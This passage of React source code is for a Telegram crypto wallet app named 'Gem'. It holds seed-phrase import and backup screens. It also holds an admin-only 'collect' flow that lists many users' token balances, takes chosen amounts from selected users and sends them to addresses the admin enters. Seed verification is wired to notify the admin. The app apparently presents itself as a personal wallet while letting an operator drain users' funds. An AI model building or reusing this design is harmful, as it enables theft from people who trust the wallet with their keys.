                              <span key={t.sym} style={{fontSize:10,color:t.color,background:`${t.color}15`,padding:"2px 6px",borderRadius:4}}>

                                {bal.toFixed(2)} {t.sym} (${usdVal.toFixed(0)})

                              </span>

                            );

                          })}

                        </div>

                      </div>

                      <p style={{fontSize:14,fontWeight:700,color:"#22c55e",margin:0}}>${u.totalUSD.toFixed(0)}</p>

                    </div>

                  );

                })}

              </div>

            </div>



            <p style={{fontSize:14,fontWeight:600,color:"#fff",margin:"0 0 12px"}}>💱 Select Amount to Collect (USD)</p>



            {/* Token Selection with USD Input */}

            <div style={{display:"flex",flexDirection:"column",gap:12}}>

              {activeTokens.map(a=> {

                const isSelected=selectedTokens.has(a.sym);

                const total=tokenTotals[a.sym]||0;

                const totalUSD=total*(prices?.[a.sym]||1);

                const currentUSD=usdAmounts[a.sym]||"0";

                const currentToken=amounts[a.sym]||"0";

                const price=prices?.[a.sym]||1;

                return (

                  <div key={a.sym} style={{

                    background:isSelected?`linear-gradient(135deg,${a.bg} 0%,#1a1a2e 100%)`:"#1a1a1a",

                    borderRadius:16,padding:16,

                    border:isSelected?`1px solid ${a.color}`:"1px solid rgba(255,255,255,0.08)",transition:"all 0.2s"}}>

                    <div style={{display:"flex",alignItems:"center",gap:12,marginBottom:12}}>

                      {/* Checkbox */}

                      <div onClick={()=>toggleToken(a.sym)} style={{width:26,height:26,borderRadius:7,border:isSelected?"none":"2px solid #333",

                        background:isSelected?a.color:"transparent",display:"flex",alignItems:"center",justifyContent:"center",cursor:"pointer"}}>

                        {isSelected&&<Check size={16} color="#000"/>}

                      </div>

                      

                      {/* Token Icon */}

                      <div style={{width:40,height:40,borderRadius:10,background:`${a.color}20`,

                        display:"flex",alignItems:"center",justifyContent:"center",fontSize:18,color:a.color}}>

                        {a.icon}

                      </div>

                      

                      {/* Info */}

                      <div style={{flex:1}}>

                        <p style={{fontSize:15,fontWeight:700,color:"#fff",margin:0}}>{a.name}</p>

                        <p style={{fontSize:11,color:"rgba(255,255,255,0.5)",margin:"2px 0 0"}}>

                          Price: ${price.toFixed(2)}

                        </p>

                      </div>



                      {/* Total Available */}

                      <div style={{textAlign:"right"}}>

                        <p style={{fontSize:12,color:"rgba(255,255,255,0.5)",margin:0}}>Available</p>

                        <p style={{fontSize:16,fontWeight:700,color:a.color,margin:0}}>{total.toFixed(2)} {a.sym}</p>

                        <p style={{fontSize:11,color:"#22c55e",margin:0}}>${totalUSD.toFixed(0)}</p>

                      </div>

                    </div>



                    {/* USD Input - only show if selected */}

                    {isSelected&&(

                      <div style={{background:"#0f0f0f",borderRadius:12,padding:12,marginTop:8}}>

                        <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:8}}>

                          <DollarSign size={16} color="#22c55e"/>

                          <span style={{fontSize:12,color:"rgba(255,255,255,0.6)"}}>Enter USD amount:</span>

                        </div>

                        <div style={{display:"flex",gap:8,alignItems:"center"}}>

                          <div style={{flex:1,position:"relative"}}>

                            <span style={{position:"absolute",left:12,top:"50%",transform:"translateY(-50%)",color:"#22c55e",fontSize:18,fontWeight:700}}>$</span>

                            <input 

                              type="number" 

                              placeholder="0.00"

                              value={currentUSD}

                              onChange={(e)=>handleUsdAmountChange(a.sym,e.target.value)}

                              style={{width:"100%",padding:"12px 12px 12px 28px",borderRadius:10,border:"1px solid #333",

                                background:"#1a1a1a",color:"#fff",fontSize:16,fontWeight:600}}/>

                          </div>

                          <ArrowRight size={20} color="rgba(255,255,255,0.3)"/>

                          <div style={{flex:1,padding:"12px",borderRadius:10,background:`${a.color}15`,border:`1px solid ${a.color}40`}}>

                            <p style={{fontSize:18,fontWeight:700,color:a.color,margin:0,textAlign:"center"}}>

                              {parseFloat(currentToken).toFixed(4)}

                            </p>

                            <p style={{fontSize:10,color:a.color,margin:0,textAlign:"center",opacity:0.8}}>{a.sym}</p>

                          </div>

                        </div>

                        <p style={{fontSize:10,color:"rgba(255,255,255,0.4)",margin:"8px 0 0",textAlign:"center"}}>

                          Auto-converted at ${price.toFixed(2)} per {a.sym}

                        </p>

                      </div>

                    )}

                  </div>

                );

              })}

            </div>



            {/* Navigation */}

            <div style={{display:"flex",gap:10,marginTop:20}}>

              <button onClick={()=>setStep(1)} style={{flex:1,padding:14,borderRadius:14,border:"1px solid #333",

                background:"#1a1a1a",color:"#fff",fontSize:14,cursor:"pointer"}}>

                ← Back

              </button>

              <button onClick={goToStep3} disabled={selectedTokens.size===0} style={{

                flex:2,padding:14,borderRadius:14,border:"none",

                background:selectedTokens.size>0?"linear-gradient(135deg,#f59e0b,#d97706)":"#333",

                color:selectedTokens.size>0?"#000":"#666",

                fontSize:16,fontWeight:700,cursor:selectedTokens.size>0?"pointer":"not-allowed"}}>

                Continue ({selectedTokens.size} tokens)

              </button>

            </div>

          </div>

        )}



        {/* STEP 3: Target Addresses */}

        {step===3&&(

          <div style={{padding:"16px 20px",animation:"fadeIn 0.3s"}}>

            {/* Summary */}

            <div style={{background:"linear-gradient(135deg,#0f0a33 0%,#1a0f4a 100%)",borderRadius:16,padding:20,

              border:"1px solid rgba(37,99,235,0.3)",marginBottom:20}}>

              <p style={{fontSize:12,color:"rgba(255,255,255,0.6)",margin:"0 0 12px"}}>Transaction Summary</p>

              <div style={{display:"flex",flexWrap:"wrap",gap:8}}>

                {Array.from(selectedTokens).map(sym=> {

                  const a=ASSET_META.find(x=>x.sym===sym);

                  const amt=amounts[sym]||tokenTotals[sym]||0;

                  return (

                    <div key={sym} style={{display:"flex",alignItems:"center",gap:6,padding:"6px 12px",

                      borderRadius:20,background:`${a.color}15`,border:`1px solid ${a.color}40`}}>

                      <span style={{color:a.color,fontSize:12}}>{a.icon}</span>

                      <span style={{color:"#fff",fontSize:13,fontWeight:600}}>{parseFloat(amt).toFixed(2)} {sym}</span>

                    </div>

                  );

                })}

              </div>

            </div>



            <p style={{fontSize:14,fontWeight:600,color:"#fff",margin:"0 0 16px"}}>Enter Destination Addresses</p>



            {/* Address Inputs */}

            <div style={{display:"flex",flexDirection:"column",gap:12}}>

              {Array.from(selectedTokens).map(sym=> {

                const a=ASSET_META.find(x=>x.sym===sym);

                const amt=amounts[sym]||tokenTotals[sym]||0;

                return (

                  <div key={sym} style={{background:"#1a1a1a",borderRadius:14,padding:14,

                    border:"1px solid rgba(255,255,255,0.08)"}}>

                    <div style={{display:"flex",alignItems:"center",gap:10,marginBottom:10}}>

                      <div style={{width:36,height:36,borderRadius:10,background:`${a.color}20`,

                        display:"flex",alignItems:"center",justifyContent:"center",color:a.color}}>

                        {a.icon}

                      </div>

                      <div>

                        <p style={{fontSize:14,fontWeight:600,color:"#fff",margin:0}}>{a.name}</p>

                        <p style={{fontSize:12,color:a.color,margin:0}}>{parseFloat(amt).toFixed(4)} {sym}</p>

                      </div>

                    </div>

                    <input type="text" placeholder={`Enter ${sym} receiving address...`}

                      value={targetAddresses[sym]||""}

                      onChange={e=>setTargetAddresses(prev=>({...prev,[sym]:e.target.value}))}

                      style={{width:"100%",padding:"12px 14px",borderRadius:10,border:"1px solid #333",

                        background:"#0f0f0f",color:"#fff",fontSize:13,fontFamily:"monospace"}} />

                  </div>

                );

              })}

            </div>



            {/* Navigation */}

            <div style={{display:"flex",gap:10,marginTop:20}}>

              <button onClick={()=>setStep(2)} style={{flex:1,padding:14,borderRadius:14,border:"1px solid #333",

                background:"#1a1a1a",color:"#fff",fontSize:14,cursor:"pointer"}}>

                ← Back

              </button>

              <button onClick={executeTransactions} disabled={isProcessing} style={{

                flex:2,padding:14,borderRadius:14,border:"none",

                background:"linear-gradient(135deg,#22c55e,#16a34a)",color:"#fff",

                fontSize:16,fontWeight:700,cursor:isProcessing?"not-allowed":"pointer",

                opacity:isProcessing?0.7:1}}>

                {isProcessing?(

                  <span style={{display:"flex",alignItems:"center",gap:8,justifyContent:"center"}}>

                    <RefreshCw size={18} className="spin"/> Processing...

                  </span>

                ):(

                  <span style={{display:"flex",alignItems:"center",gap:8,justifyContent:"center"}}>

                    Execute Transactions <ArrowRight size={18}/>

                  </span>

                )}

              </button>

            </div>

          </div>

        )}



        {/* STEP 4: Success */}

        {step===4&&(

          <div style={{padding:"40px 20px",textAlign:"center",animation:"fadeIn 0.5s"}}>

            <div style={{width:100,height:100,borderRadius:"50%",margin:"0 auto 24px",

              background:"linear-gradient(135deg,#22c55e,#16a34a)",

              display:"flex",alignItems:"center",justifyContent:"center"}}>

              <Check size={50} color="#fff"/>

            </div>

            <p style={{fontSize:24,fontWeight:800,color:"#22c55e",margin:"0 0 12px"}}>All Transactions Sent!</p>

            <p style={{fontSize:14,color:"rgba(255,255,255,0.6)",margin:"0 0 30px",lineHeight:1.6}}>

              Successfully processed {selectedUsers.size} users<br/>

              and sent {selectedTokens.size} tokens

            </p>

            

            <div style={{background:"#1a1a1a",borderRadius:16,padding:20,marginBottom:30}}>

              <p style={{fontSize:12,color:"rgba(255,255,255,0.5)",margin:"0 0 16px"}}>Transaction Details</p>

              {Array.from(selectedTokens).map(sym=> {

                const a=ASSET_META.find(x=>x.sym===sym);

                const amt=amounts[sym]||tokenTotals[sym]||0;

                return (

                  <div key={sym} style={{display:"flex",alignItems:"center",justifyContent:"space-between",

                    padding:"10px 0",borderBottom:"1px solid #222"}}>

                    <div style={{display:"flex",alignItems:"center",gap:8}}>

                      <span style={{color:a.color}}>{a.icon}</span>

                      <span style={{color:"#fff",fontSize:14}}>{sym}</span>

                    </div>

                    <div style={{textAlign:"right"}}>

                      <p style={{color:"#fff",fontSize:14,fontWeight:600,margin:0}}>{parseFloat(amt).toFixed(4)}</p>

                      <p style={{color:"#22c55e",fontSize:11,margin:0}}>✓ Sent</p>

                    </div>

                  </div>

                );

              })}

            </div>



            <button onClick={reset} style={{padding:"14px 32px",borderRadius:14,border:"1px solid #333",

              background:"#1a1a1a",color:"#fff",fontSize:16,cursor:"pointer"}}>

              🔄 Start New Collection

            </button>

          </div>

        )}

      </div>

    </Sheet>

  );

}



function OnboardScreen({ onCreate, onImport }) {

  const [importing, setImporting] = useState(false);

  const [words, setWords] = useState(Array(12).fill(""));

  const [error, setError] = useState("");

  const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;

  const firstName = tgUser?.first_name || "друг";



  function tryImport() {

    const filled = words.filter(w => w.trim());

    if (filled.length !== 12) { setError("Введи все 12 слов"); return; }

    onImport(words.map(w => w.trim().toLowerCase()));

  }



  // Import wallet screen

  if (importing) return (

    <div style={{minHeight:"100vh",background:"#000",padding:"48px 24px"}}>

      <button onClick={()=>setImporting(false)} style={{background:"none",border:"none",color:"rgba(255,255,255,0.5)",

        fontSize:14,cursor:"pointer",padding:"0 0 24px",display:"flex",alignItems:"center",gap:6}}>

        ← Назад

      </button>

      <h2 style={{fontSize:22,fontWeight:700,color:"#fff",margin:"0 0 8px"}}>Импорт кошелька</h2>

      <p style={{fontSize:14,color:"rgba(255,255,255,0.4)",margin:"0 0 24px"}}>Введи 12 слов сид-фразы</p>

      {error&&<p style={{color:"#EF4444",fontSize:13,margin:"0 0 16px"}}>{error}</p>}

      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:8,marginBottom:24}}>

        {words.map((w,i)=>(

          <div key={i} style={{background:"#1a1a1a",borderRadius:10,padding:"8px 10px",

            border:"1px solid rgba(255,255,255,0.08)",display:"flex",alignItems:"center",gap:6}}>

            <span style={{fontSize:10,color:"rgba(255,255,255,0.25)",minWidth:14}}>{i+1}</span>

            <input value={w} onChange={e=>{const n=[...words];n[i]=e.target.value;setWords(n);}}

              style={{background:"none",border:"none",outline:"none",color:"#fff",fontSize:12,width:"100%"}}

              placeholder="слово"/>

          </div>

        ))}

      </div>

      <button onClick={tryImport} style={{width:"100%",padding:"17px",borderRadius:16,border:"none",

        background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:16,fontWeight:600,cursor:"pointer"}}>

        Импортировать

      </button>

    </div>

  );



  // Main welcome screen

  return (

    <div style={{minHeight:"100vh",background:"#000",display:"flex",flexDirection:"column",

      alignItems:"center",justifyContent:"center",padding:"32px 24px",position:"relative",overflow:"hidden"}}>

      

      {/* Background glows */}

      <div style={{position:"absolute",top:-100,left:-100,width:350,height:350,borderRadius:"50%",

        background:"radial-gradient(circle,#1e3a8a33 0%,transparent 70%)",pointerEvents:"none"}}/>

      <div style={{position:"absolute",bottom:-80,right:-80,width:280,height:280,borderRadius:"50%",

        background:"radial-gradient(circle,#7c3aed22 0%,transparent 70%)",pointerEvents:"none"}}/>



      {/* Logo */}

      {/* Avatar - Crystal on Graphite */}
      <div style={{marginBottom:48,animation:"fadeUp 0.8s cubic-bezier(0.16,1,0.3,1) both"}}>
        <div style={{width:120,height:120,borderRadius:28,background:"linear-gradient(135deg,#1e293b,#0f172a)",
          border:"1px solid rgba(255,255,255,0.1)",display:"flex",alignItems:"center",justifyContent:"center",
          boxShadow:"0 0 60px rgba(37,99,235,0.3), inset 0 1px 0 rgba(255,255,255,0.05)"}}>
          <CrystalIcon size={56}/>
        </div>
      </div>

      {/* Buttons - Wallet Style */}
      <div style={{width:"100%",maxWidth:340,display:"flex",flexDirection:"column",gap:14,
        animation:"fadeUp 0.8s 0.15s cubic-bezier(0.16,1,0.3,1) both"}}>
        <button onClick={()=>onCreate()} style={{width:"100%",padding:"18px 24px",borderRadius:16,border:"none",
          background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:16,fontWeight:600,
          cursor:"pointer",boxShadow:"0 8px 32px rgba(37,99,235,0.4)",letterSpacing:"0.01em",
          transition:"all 0.3s cubic-bezier(0.4,0,0.2,1)",transform:"translateY(0)"}}
          onMouseEnter={(e)=>{e.target.style.transform="translateY(-2px)";e.target.style.boxShadow="0 12px 40px rgba(37,99,235,0.5)";}}
          onMouseLeave={(e)=>{e.target.style.transform="translateY(0)";e.target.style.boxShadow="0 8px 32px rgba(37,99,235,0.4)";}}>
          💎 Создать новый кошелёк
        </button>
        <button onClick={()=>setImporting(true)} style={{width:"100%",padding:"18px 24px",borderRadius:16,
          border:"1px solid rgba(255,255,255,0.12)",background:"rgba(255,255,255,0.04)",
          color:"rgba(255,255,255,0.85)",fontSize:15,fontWeight:500,cursor:"pointer",
          transition:"all 0.3s cubic-bezier(0.4,0,0.2,1)"}}
          onMouseEnter={(e)=>{e.target.style.background="rgba(255,255,255,0.08)";e.target.style.borderColor="rgba(255,255,255,0.2)";}}
          onMouseLeave={(e)=>{e.target.style.background="rgba(255,255,255,0.04)";e.target.style.borderColor="rgba(255,255,255,0.12)";}}>
          📥 Импортировать кошелёк
        </button>
      </div>

    </div>

  );

}



// ─── BACKUP SCREEN ────────────────────────────────────────────────────────────

// Separate screens: 1) Show seed phrase, 2) Verify 4 random words

function BackupScreen({ mnemonic, onDone, onVerified }) {

  const [step,setStep]=useState("show"); // show | verify | done

  const [rev,setRev]=useState(false);



  // Generate 4 random word indices for verification

  const randomIndices = useMemo(()=>{

    const idxs=[...Array(12).keys()];

    for(let i=idxs.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[idxs[i],idxs[j]]=[idxs[j],idxs[i]];}

    return idxs.slice(0,4).sort((a,b)=>a-b);

  },[mnemonic.join(" ")]);



  // Initialize verification words when entering verify step

  const [verifyWords,setVerifyWords]=useState([]);

  useEffect(()=>{

    if(step==="verify"){

      setVerifyWords(randomIndices.map(i=>({idx:i,word:mnemonic[i],input:""})));

    }

  },[step,randomIndices,mnemonic]);



  function checkVerify() {

    const ok=verifyWords.every(v=>v.input.trim().toLowerCase()===v.word.toLowerCase());

    if(ok){

      // ✅ Вызываем колбэк успешной верификации (для уведомления админа)

      if(onVerified) onVerified();

      setStep("done");

    }else{alert("Some words are incorrect. Please check and try again.");}

  }



  // ─── STEP 3: DONE ───────────────────────────────────────────────────────────

  if(step==="done") return (

    <div style={{minHeight:"100vh",background:"#000",display:"flex",flexDirection:"column",

      alignItems:"center",justifyContent:"center",padding:"32px 24px"}}>

      <div style={{marginBottom:20,display:"flex",alignItems:"center",justifyContent:"center"}}>

        <div style={{width:80,height:80,borderRadius:"50%",background:"linear-gradient(135deg,#22C55E,#16a34a)",display:"flex",alignItems:"center",justifyContent:"center"}}>

          <Shield size={40} color="#fff"/>

        </div>

      </div>

      <h2 style={{fontSize:24,fontWeight:700,color:"#fff",margin:"0 0 12px"}}>Wallet Secured!</h2>

      <p style={{fontSize:14,color:"rgba(255,255,255,0.5)",textAlign:"center",marginBottom:32}}>Your recovery phrase is backed up.</p>

      <button onClick={onDone} style={{width:"100%",maxWidth:320,padding:"17px",borderRadius:16,border:"none",

        background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:16,fontWeight:600,cursor:"pointer"}}>

        Go to Wallet →

      </button>

    </div>

  );



  // ─── STEP 2: VERIFY ─────────────────────────────────────────────────────────

  if(step==="verify") return (
    <div style={{minHeight:"100vh",background:"#000",padding:"48px 24px 32px", position: "relative", overflow: "hidden"}}>
      {/* Background glows */}
      <div style={{position:"absolute",top:-100,left:-100,width:350,height:350,borderRadius:"50%",
        background:"radial-gradient(circle,#1e3a8a33 0%,transparent 70%)",pointerEvents:"none"}}/>
      <div style={{position:"absolute",bottom:-80,right:-80,width:280,height:280,borderRadius:"50%",
        background:"radial-gradient(circle,#7c3aed22 0%,transparent 70%)",pointerEvents:"none"}}/>

      <div style={{position: "relative", zIndex: 1}}>
        <div style={{textAlign:"center",marginBottom:32}}>

        <div style={{marginBottom:12,display:"flex",alignItems:"center",justifyContent:"center"}}>

          <div style={{width:60,height:60,borderRadius:"50%",background:"linear-gradient(135deg,#2563eb,#7c3aed)",display:"flex",alignItems:"center",justifyContent:"center"}}>

            <Check size={30} color="#fff"/>

          </div>

        </div>

        <h2 style={{fontSize:22,fontWeight:700,color:"#fff",margin:"0 0 8px"}}>Verify Your Backup</h2>

        <p style={{fontSize:14,color:"rgba(255,255,255,0.4)",margin:0,lineHeight:1.6}}>

          Enter the 4 words from your recovery phrase to confirm you've written them down.

        </p>

      </div>



      <div style={{background:"#0f0a00",borderRadius:12,padding:14,border:"1px solid rgba(245,158,11,0.2)",marginBottom:20}}>

        <div style={{display:"flex",alignItems:"center",gap:6}}>

          <AlertTriangle size={14} color="rgba(245,158,11,0.8)"/>

          <p style={{fontSize:12,color:"rgba(245,158,11,0.8)",margin:0}}>Enter the exact words in order</p>

        </div>

      </div>



      <div style={{display:"flex",flexDirection:"column",gap:12,marginBottom:24}}>

        {verifyWords.map((v,i)=>(

          <div key={i} style={{display:"flex",alignItems:"center",gap:12,background:"#1a1a1a",borderRadius:12,padding:"14px 16px",

            border:v.input.toLowerCase()===v.word.toLowerCase()&&v.input?"1px solid #22C55E":"1px solid rgba(255,255,255,0.1)"}}>

            <span style={{fontSize:14,color:"rgba(255,255,255,0.6)",minWidth:80,fontWeight:600}}>Word #{v.idx+1}</span>

            <input value={v.input} onChange={e=>{const n=[...verifyWords];n[i]={...n[i],input:e.target.value};setVerifyWords(n);}}

              placeholder={`Enter word #${v.idx+1}`}

              style={{flex:1,background:"none",border:"none",outline:"none",color:"#fff",fontSize:15,

                borderBottom:"1px solid rgba(255,255,255,0.2)",paddingBottom:4}}/>

            {v.input.toLowerCase()===v.word.toLowerCase()&&v.input&&<Check size={20} color="#22C55E"/>}

          </div>

        ))}

      </div>



      <button onClick={checkVerify} style={{width:"100%",padding:"17px",borderRadius:16,border:"none",

        background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:16,fontWeight:600,cursor:"pointer",marginBottom:12}}>

        Verify & Continue →

      </button>

      <button onClick={()=>setStep("show")} style={{width:"100%",padding:"14px",borderRadius:16,border:"1px solid rgba(255,255,255,0.1)",

        background:"transparent",color:"rgba(255,255,255,0.5)",fontSize:14,cursor:"pointer"}}>

        ← Back to Phrase
      </button>
      </div>
    </div>
  );



  // ─── STEP 1: SHOW PHRASE ────────────────────────────────────────────────────
  return (
    <div style={{minHeight:"100vh",background:"#000",padding:"48px 24px 32px", position: "relative", overflow: "hidden"}}>
      {/* Background glows */}
      <div style={{position:"absolute",top:-100,left:-100,width:350,height:350,borderRadius:"50%",
        background:"radial-gradient(circle,#1e3a8a33 0%,transparent 70%)",pointerEvents:"none"}}/>
      <div style={{position:"absolute",bottom:-80,right:-80,width:280,height:280,borderRadius:"50%",
        background:"radial-gradient(circle,#7c3aed22 0%,transparent 70%)",pointerEvents:"none"}}/>

      <div style={{position: "relative", zIndex: 1}}>
        <div style={{textAlign:"center",marginBottom:32}}>

        <div style={{marginBottom:12,display:"flex",alignItems:"center",justifyContent:"center"}}>

          <div style={{width:60,height:60,borderRadius:"50%",background:"linear-gradient(135deg,#F59E0B,#d97706)",display:"flex",alignItems:"center",justifyContent:"center"}}>

            <Sprout size={30} color="#fff"/>

          </div>

        </div>

        <h2 style={{fontSize:22,fontWeight:700,color:"#fff",margin:"0 0 8px"}}>Back Up Your Wallet</h2>

        <p style={{fontSize:14,color:"rgba(255,255,255,0.4)",margin:0,lineHeight:1.6}}>

          Write down these 12 words in order. This is the only way to recover your wallet.

        </p>

      </div>

      <div style={{background:"#0f0a00",borderRadius:12,padding:14,border:"1px solid rgba(245,158,11,0.2)",marginBottom:20}}>

        <div style={{display:"flex",alignItems:"center",gap:6}}>

          <AlertTriangle size={14} color="rgba(245,158,11,0.8)"/>

          <p style={{fontSize:12,color:"rgba(245,158,11,0.8)",margin:0}}>Never share this with anyone. Store it offline safely.</p>

        </div>

      </div>

      <div style={{background:"#0a0a0a",borderRadius:16,padding:16,position:"relative",overflow:"hidden",marginBottom:20}}>

        {!rev&&(

          <div style={{position:"absolute",inset:0,backdropFilter:"blur(12px)",background:"rgba(0,0,0,0.7)",

            borderRadius:16,zIndex:10,display:"flex",flexDirection:"column",alignItems:"center",

            justifyContent:"center",gap:10}}>

            <Lock size={22} color="rgba(255,255,255,0.4)"/>

            <button onClick={()=>setRev(true)} style={{padding:"10px 24px",borderRadius:12,

              border:"1px solid rgba(255,255,255,0.15)",background:"rgba(255,255,255,0.08)",

              color:"#fff",fontSize:13,fontWeight:500,cursor:"pointer"}}>Reveal Phrase</button>

          </div>

        )}

        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:8,filter:rev?"none":"blur(8px)"}}>
          {mnemonic.length === 0 && (
            <div style={{gridColumn: "1/-1", textAlign: "center", padding: "20px", color: "rgba(255,255,255,0.4)"}}>
              Генерация фразы...
            </div>
          )}
          {mnemonic.map((w,i)=>(
            <div key={i} style={{background:"#161616",borderRadius:8,padding:"7px 10px",
              display:"flex",alignItems:"center",gap:6,border:"1px solid rgba(255,255,255,0.06)"}}>

              <span style={{fontSize:10,color:"rgba(255,255,255,0.25)",minWidth:14}}>{i+1}</span>

              <span style={{fontSize:12,color:"#fff",fontWeight:500}}>{w}</span>

            </div>

          ))}

        </div>

      </div>

      {rev&&(

        <button onClick={()=>setStep("verify")} style={{width:"100%",padding:"17px",borderRadius:16,border:"none",

          background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:16,fontWeight:600,cursor:"pointer",marginBottom:12}}>

          I Wrote It Down →

        </button>
      )}
      </div>
    </div>
  );

}



// ─── AVATAR HEADER COMPONENT ─────────────────────────────────────────────────

function AvatarHeader({ liveStatus }) {

  const [avatar,setAvatar]=useState(()=>localStorage.getItem(storageKey("avatar"))||"crystal");

  const [avatarBg,setAvatarBg]=useState(()=>localStorage.getItem(storageKey("avatarBg"))||"graphite");

  

  // Listen for storage changes

  useEffect(()=>{

    const handleStorage=()=>{

      setAvatar(localStorage.getItem(storageKey("avatar"))||"crystal");

      setAvatarBg(localStorage.getItem(storageKey("avatarBg"))||"graphite");

    };

    window.addEventListener("storage",handleStorage);

    // Also check every second for changes from same tab

    const interval=setInterval(handleStorage,1000);

    return()=>{

      window.removeEventListener("storage",handleStorage);

      clearInterval(interval);

    };

  },[]);

  

  const bgOptions={

    graphite:"linear-gradient(135deg,#374151,#1f2937)",

    gradient:"linear-gradient(135deg,#2563eb,#7c3aed)",

    purple:"linear-gradient(135deg,#7c3aed,#ec4899)",

    green:"linear-gradient(135deg,#22C55E,#16a34a)",

    orange:"linear-gradient(135deg,#F59E0B,#EF4444)",

    dark:"linear-gradient(135deg,#1f2937,#111827)",

    blue:"linear-gradient(135deg,#0ea5e9,#2563eb)",

  };

  const currentBg=bgOptions[avatarBg]||bgOptions.graphite;

  

  const avatarIcons={

    crystal:<CrystalIcon size={28}/>,

    gem:<GemLogo size={20}/>,

    diamond:<Diamond size={20} color="#2563eb"/>,

    user:<UserCircle size={20} color="#8B9CF7"/>,

    zap:<Zap size={20} color="#F59E0B"/>,

  };

  const currentAvatar=avatarIcons[avatar]||avatarIcons.crystal;

  

  return (

    <div style={{display:"flex",alignItems:"center",gap:10}}>

      <div style={{width:36,height:36,borderRadius:10,background:currentBg,display:"flex",alignItems:"center",justifyContent:"center",border:"1px solid rgba(255,255,255,0.1)"}}>

        {currentAvatar}

      </div>

      <div style={{display:"flex",alignItems:"center",gap:6}}>

        <span style={{fontSize:17,fontWeight:700,color:"#fff",letterSpacing:"-0.02em"}}>Gem</span>

        <div style={{width:6,height:6,borderRadius:"50%",background:liveStatus==="live"?"#22C55E":liveStatus==="loading"?"#F59E0B":"#555"}}/>

      </div>

    </div>

  );

}



// ─── ERROR BOUNDARY ───────────────────────────────────────────────────────────

class ErrorBoundary extends React.Component {

  constructor(props) {

    super(props);

    this.state = { hasError: false, error: null };

  }

  static getDerivedStateFromError(error) {

    return { hasError: true, error };

  }

  componentDidCatch(error, errorInfo) {

    console.error("[ErrorBoundary]", error, errorInfo);

  }

  render() {

    if (this.state.hasError) {

      const errorMsg = this.state.error?.toString?.() || this.state.error?.message || "Unknown error";

      const errorStack = this.state.error?.stack || "";

      console.error("[ERROR DETAILS]", errorMsg, errorStack);

      return (

        <div style={{minHeight:"100vh",background:"#000",display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",padding:24,overflow:"auto"}}>

          <div style={{fontSize:48,marginBottom:16}}>⚠️</div>

          <h2 style={{color:"#fff",marginBottom:12}}>Something went wrong</h2>

          <div style={{color:"#ff6b6b",textAlign:"center",marginBottom:24,fontFamily:"monospace",fontSize:14,maxWidth:"90%",wordBreak:"break-word",padding:16,background:"rgba(255,0,0,0.1)",borderRadius:8}}>

            {errorMsg}

          </div>

          {errorStack && (

            <pre style={{color:"rgba(255,255,255,0.5)",fontSize:11,maxWidth:"90%",maxHeight:"40vh",overflow:"auto",textAlign:"left",padding:16,background:"rgba(0,0,0,0.3)",borderRadius:8,marginBottom:24}}>

              {errorStack}

            </pre>

          )}

          <div style={{display:"flex",gap:12}}>

            <button onClick={()=>window.location.reload()} style={{padding:"12px 24px",borderRadius:12,background:"#2563eb",color:"#fff",border:"none",cursor:"pointer"}}>

              Reload App

            </button>

            <button onClick={()=>handleAction("lock")} style={{padding:"8px 12px",borderRadius:10,border:"none",background:"#1a1a1a",color:"#fff",fontSize:12,cursor:"pointer",display:"flex",alignItems:"center",gap:6}}>

              <Lock size={16}/> Lock

            </button>

          </div>

        </div>

      );

    }

    return this.props.children;

  }

}



// ─── MAIN WALLET APP ──────────────────────────────────────────────────────────

function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }) {

  const [tab,setTab]=useState(initialTab||"wallet");

  const [modal,setModal]=useState(null);

  const [animKey,setAnimKey]=useState(0);

  const [network,setNetwork]=useState("mainnet");

  const [toast,setToast]=useState(null);

  const [liveStatus,setLiveStatus]=useState("idle"); // idle | loading | live | error

  const [error,setError]=useState(null);

  const [isReady,setIsReady]=useState(false);

  // Проверка админа — три источника для надёжности

  const userIsAdmin = (() => {

    try {

      if (sessionStorage.getItem("gem_is_admin") === "1") return true;

      const id = RESOLVED_USER_ID || window?.Telegram?.WebApp?.initDataUnsafe?.user?.id;

      return String(id) === ADMIN_ID;

    } catch { return false; }

  })();



  useEffect(()=>{

    try {

      setIsReady(true);

      return () => {};

    } catch (e) {

      console.error("[WalletApp] Init error:", e);

      setError(e.message);

    }

  },[]);



  // Live state

  const [prices,setPrices]=useState({...INITIAL_PRICES});

  const [changes,setChanges]=useState({ETH:-1.12,BNB:0.87,SOL:5.43,TON:-0.23,LTC:0.45,ARB:1.23,USDT:0.01});

  

  // Production mode by default
  const isAdminMode = false;
  const [testMode, setTestMode] = useState(false);
  const [balances,setBalances]=useState({...INITIAL_BALANCES});

  // Transaction history — persisted to localStorage per user
  const [txHistory,setTxHistory]=useState(()=>{
    try {
      const stored = localStorage.getItem(storageKey("gem_tx_history"));
      if (!stored) return [];
      const parsed = JSON.parse(stored);
      return Array.isArray(parsed) ? parsed : [];
    } catch { return []; }
  });



  // Auto-save txHistory to localStorage whenever it changes

  useEffect(()=>{

    try {

      if (Array.isArray(txHistory)) {

        localStorage.setItem(storageKey("gem_tx_history"), JSON.stringify(txHistory));

      }

    } catch(e) { console.error("[txHistory save]", e); }

  }, [txHistory]);



  // Error boundary effect

  useEffect(()=>{

    const handleError=(e)=>{

      // "Script error." is a browser security restriction for cross-origin scripts

      // (e.g. html5-qrcode loading ZXing from unpkg CDN). Ignore it — the app is fine.

      if (!e.message || e.message === "Script error.") return;

      console.error("[WalletApp Error]", e);

      setError(e.message);

    };

    window.addEventListener("error", handleError);

    return()=>window.removeEventListener("error", handleError);

  },[]);



  // Build assets array with live balances

  const assets = ASSET_META.map(a=>({

    ...a, balance:balances[a.sym]||0, chg:changes[a.sym]||0

  }));



  function showToast(msg,type="success"){setToast({msg,type,id:Date.now()});}



  // ─── ADMIN ONLY: Cancel Transaction ──────────────────────────────────────────

  function handleCancelTx(tx) {

    // Only admin can cancel transactions

    if (!isAdminMode) {

      showToast("Only admin can cancel transactions", "error");

      return;

    }

    

